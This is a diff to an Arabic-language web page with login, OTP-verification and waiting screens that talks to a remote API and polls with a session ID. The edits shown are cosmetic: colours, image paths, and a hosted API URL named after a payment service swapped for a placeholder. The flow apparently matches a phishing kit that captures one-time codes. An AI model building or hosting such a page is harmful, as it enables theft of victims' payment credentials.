@@ -8,15 +8,15 @@
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
-  --purple:#6B1FA8;
-  --purple-dark:#3D0A6B;
-  --purple-mid:#8B30C0;
-  --purple-light:#A870D4;
-  --purple-btn:#9B68C8;
-  --purple-muted:#C4A0E0;
+  --purple:#7B2FBF;
+  --purple-dark:#42008A;
+  --purple-mid:#9040D0;
+  --purple-light:#B060E0;
+  --purple-btn:#9B70CC;
+  --purple-muted:#C8A8E8;
   --white:#FFFFFF;
-  --bg-grad-top:#3A0C64;
-  --bg-grad-bot:#7A28A8;
+  --bg-grad-top:#35006B;
+  --bg-grad-bot:#8A2BBF;
   --text-dark:#1A1A1A;
   --text-muted:#888;
   --border:#E0D0F0;
@@ -225,7 +225,7 @@ html,body{height:100%;font-family:'Cairo',sans-serif;overflow:hidden}
 <div class="screen active" id="screen-login">
   <div class="purple-bg">
     <div class="logo-area">
-      <img src="IMG_1976.PNG" alt="Logo">
+      <img src="IMG_1976" alt="Logo">
     </div>
     <div class="card">
       <div class="card-title">مرحباً!</div>
@@ -260,7 +260,7 @@ html,body{height:100%;font-family:'Cairo',sans-serif;overflow:hidden}
 <div class="screen" id="screen-otp">
   <div class="purple-bg">
     <div class="logo-area sm">
-      <img src="IMG_1976.PNG" alt="Logo">
+      <img src="IMG_1976" alt="Logo">
     </div>
     <div class="otp-card">
       <div class="otp-title">رمز التحقق</div>
@@ -299,7 +299,7 @@ html,body{height:100%;font-family:'Cairo',sans-serif;overflow:hidden}
 <div class="screen" id="screen-success">
   <div class="purple-bg">
     <div class="logo-area sm">
-      <img src="IMG_1976.PNG" alt="Logo">
+      <img src="IMG_1976" alt="Logo">
     </div>
     <div class="success-card">
       <div id="wait-screen">
@@ -325,7 +325,7 @@ html,body{height:100%;font-family:'Cairo',sans-serif;overflow:hidden}
 </div>
 
 <script>
-const API = 'https://fawryonline.onrender.com';
+const API = 'https://YOUR-RENDER-URL.onrender.com';
 let SESSION_ID = null;
 let timerInterval = null, timerSeconds = 3600;
 let pollInterval = null;
